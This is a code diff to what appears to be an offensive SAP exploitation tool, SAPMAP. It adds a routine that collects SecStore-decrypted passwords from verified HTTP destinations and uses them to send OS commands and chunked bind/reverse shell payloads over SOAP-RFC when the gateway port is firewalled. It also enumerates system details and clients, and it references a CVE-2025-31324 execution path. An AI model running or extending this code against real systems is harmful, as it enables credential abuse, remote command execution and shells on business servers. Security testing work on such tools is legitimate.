@@ -358,6 +358,53 @@ def _correct_node_from_http(target_node, http_info: dict):
                   f"{label}={icm_port}")
 
 
+def find_soap_rfc_route_for_node(state, target_node) -> dict:
+    """Return a SOAPRFCSession-ready route to `target_node`, or None.
+
+    Scans the state for any HTTP connection (Type-G/H) that:
+      * targets this node (conn.target_sid == target_node.sid)
+      * has been verified by Test Connection (soap_rfc_verified)
+      * carries a SecStore-decrypted password (secstore_password)
+
+    When found, resolves the actual ICM host:port via
+    _resolve_soap_endpoint and returns:
+      {
+        "host": str, "port": int, "https": bool,
+        "client": str, "user": str, "password": str,
+        "via_destination": str,    # for log messages
+      }
+
+    Callers use this to dispatch OS exec, table reads, etc. through
+    SOAP-RFC when the gateway port (33NN) is unreachable from the
+    SAPMAP host.  Returns None when no viable route exists — caller
+    should then fall back to pyrfc or the unauthenticated GW path.
+    """
+    if not target_node or not state:
+        return None
+    for conn in getattr(state, "connections", []):
+        if conn.target_sid != target_node.sid:
+            continue
+        if (conn.conn_type or "").lower() != "http":
+            continue
+        if not getattr(conn, "soap_rfc_verified", False):
+            continue
+        if not (conn.rfc_user and conn.secstore_password):
+            continue
+        endpoint = _resolve_soap_endpoint(conn, target_node)
+        if not endpoint.get("ok"):
+            continue
+        return {
+            "host": endpoint["host"],
+            "port": endpoint["port"],
+            "https": endpoint["https"],
+            "client": conn.client or "000",
+            "user": conn.rfc_user,
+            "password": conn.secstore_password,
+            "via_destination": conn.destination_name,
+        }
+    return None
+
+
 def _resolve_soap_endpoint(conn, target_node) -> dict:
     """Pick a host/port/scheme tuple for SOAP-RFC against `target_node`.
 
@@ -8651,6 +8698,95 @@ def create_app(api: SAPMAPApi) -> Bottle:
                                           f"verified over HTTP")
                                     target_node.has_critical_finding = True
 
+                                    # Phase 3b: fill OS / Database /
+                                    # Kernel / SAP Release rows in the
+                                    # System Details modal via
+                                    # RFC_GET_SYSTEM_INFO over SOAP.
+                                    try:
+                                        sysinfo = (
+                                            soap_sess.get_system_info())
+                                    except Exception:
+                                        sysinfo = {"ok": False,
+                                                   "info": {}}
+                                    if sysinfo.get("ok"):
+                                        si = sysinfo["info"]
+                                        if (si.get("RFCOPSYS")
+                                                and not target_node.os_type):
+                                            target_node.os_type = (
+                                                si["RFCOPSYS"].strip())
+                                        if (si.get("RFCDBSYS")
+                                                and not target_node.db_type):
+                                            target_node.db_type = (
+                                                si["RFCDBSYS"].strip())
+                                        if (si.get("RFCKERNRL")
+                                                and not target_node.kernel):
+                                            target_node.kernel = (
+                                                si["RFCKERNRL"].strip())
+                                        if (si.get("RFCSAPRL")
+                                                and not target_node.sap_release):
+                                            target_node.sap_release = (
+                                                si["RFCSAPRL"].strip())
+                                        print(f"[+] {conn.target_sid}: "
+                                              f"system info via SOAP "
+                                              f"— kernel "
+                                              f"{si.get('RFCKERNRL','?')} "
+                                              f"release "
+                                              f"{si.get('RFCSAPRL','?')} "
+                                              f"OS "
+                                              f"{si.get('RFCOPSYS','?')} "
+                                              f"DB "
+                                              f"{si.get('RFCDBSYS','?')}")
+
+                                    # Phase 3b: read T000 clients via
+                                    # SOAP so the Clients section
+                                    # gets P/C/T/D categories instead
+                                    # of only the verified-V entry.
+                                    try:
+                                        tr = soap_sess.read_table(
+                                            "T000",
+                                            fields=["MANDT",
+                                                    "CCCATEGORY",
+                                                    "MTEXT"])
+                                    except Exception:
+                                        tr = {"ok": False, "rows": []}
+                                    if tr.get("ok") and tr["rows"]:
+                                        existing_v = {
+                                            c["nr"]: c for c in
+                                            target_node.clients
+                                            if c.get("category") == "V"}
+                                        # Merge: keep V-category
+                                        # entries that aren't returned
+                                        # by T000 read.  Replace
+                                        # everything else with the
+                                        # authoritative T000 view.
+                                        new_clients = []
+                                        seen = set()
+                                        for r in tr["rows"]:
+                                            nr = r.get("MANDT", "").zfill(3)
+                                            if not nr:
+                                                continue
+                                            new_clients.append({
+                                                "nr": nr,
+                                                "category": r.get(
+                                                    "CCCATEGORY", ""),
+                                                "mtext": r.get(
+                                                    "MTEXT", ""),
+                                            })
+                                            seen.add(nr)
+                                        # Preserve V markers for
+                                        # clients absent from T000
+                                        # (defensive — shouldn't
+                                        # happen, but never lose
+                                        # verification provenance).
+                                        for nr, v in existing_v.items():
+                                            if nr not in seen:
+                                                new_clients.append(v)
+                                        target_node.clients = new_clients
+                                        print(f"[+] {conn.target_sid}: "
+                                              f"T000 read via SOAP — "
+                                              f"{len(new_clients)} "
+                                              f"client(s) enumerated")
+
                                     # Follow-up: read profiles + roles
                                     # via BAPI_USER_GET_DETAIL so the
                                     # modal shows actual SAP_ALL state
@@ -8969,15 +9105,35 @@ def create_app(api: SAPMAPApi) -> Bottle:
         if not command:
             return json.dumps({"error": "No command specified"})
 
+        # Phase 3b: discover any SOAP-RFC route to this node, so the
+        # gateway / sxpg methods can transparently fall back to HTTP
+        # when the gateway port is firewalled.
+        soap_route = find_soap_rfc_route_for_node(api.state, node)
+
         if method == "gateway":
             if not node.gw_vulnerable:
                 return json.dumps({"error": "Gateway not vulnerable on this system"})
-            result = sapmap_exploit.execute_os_command(node, command, params)
+            result = sapmap_exploit.execute_os_command(
+                node, command, params, soap_route=soap_route)
         elif method == "sxpg":
             creds = node.best_credentials()
-            if not creds:
+            if not creds and not soap_route:
                 return json.dumps({"error": "No credentials available"})
-            result = sapmap_rfc.execute_local_command(node, command, params, creds)
+            # Prefer SOAP-RFC when the gateway is down (or when we have
+            # no pyrfc creds but DO have a SOAP route) — execute_os_command
+            # handles the gateway-reachability gate internally.
+            result = sapmap_exploit.execute_os_command(
+                node, command, params, creds=creds,
+                soap_route=soap_route, prefer="sxpg")
+        elif method == "soap_rfc":
+            if not soap_route:
+                return json.dumps({"error":
+                    "No SOAP-RFC route to this node — Test "
+                    "Connection on a Type-G/H destination first to "
+                    "verify creds + ICM port"})
+            result = sapmap_exploit.execute_os_command(
+                node, command, params, soap_route=soap_route,
+                prefer="soap_rfc")
         elif method == "cve_31324":
             if not node.cve_2025_31324_vulnerable:
                 return json.dumps({"error": "CVE-2025-31324 not confirmed — "
@@ -9165,6 +9321,13 @@ def create_app(api: SAPMAPApi) -> Bottle:
                     if _shell_session:
                         _shell_session.progress_msg = msg
 
+            # Phase 3b: discover any SOAP-RFC route to this node so
+            # bind/reverse shells survive firewalled gateways.  The
+            # chunked-payload loop and the final exec both go through
+            # execute_os_command, which uses soap_route as fallback
+            # when the gateway port is unreachable.
+            soap_route = find_soap_rfc_route_for_node(api.state, node)
+
             if method == "gateway":
                 # GW: EXTPROG = "command", PARAMS = "params", LONG_PARAMS = "long_params"
                 # long_params="" prevents old-kernel PARAMS+LONG_PARAMS concatenation.
@@ -9179,11 +9342,13 @@ def create_app(api: SAPMAPApi) -> Bottle:
                             f"Writing payload chunk {idx+1}/{total}...")
                         sapmap_exploit.execute_os_command(
                             node, step["command"], step["params"],
-                            long_params=step.get("long_params"))
+                            long_params=step.get("long_params"),
+                            soap_route=soap_route)
                 _set_progress("Executing payload...")
                 result = sapmap_exploit.execute_os_command(
                     node, payload["command"], payload["params"],
-                    long_params=payload.get("long_params"))
+                    long_params=payload.get("long_params"),
+                    soap_route=soap_route)
             elif method == "cve_31324":
                 # CVE-2025-31324 via the JSP shell has no 128/255-byte
                 # EXTPROG/PARAMS limits, so we skip the chunked base64 write
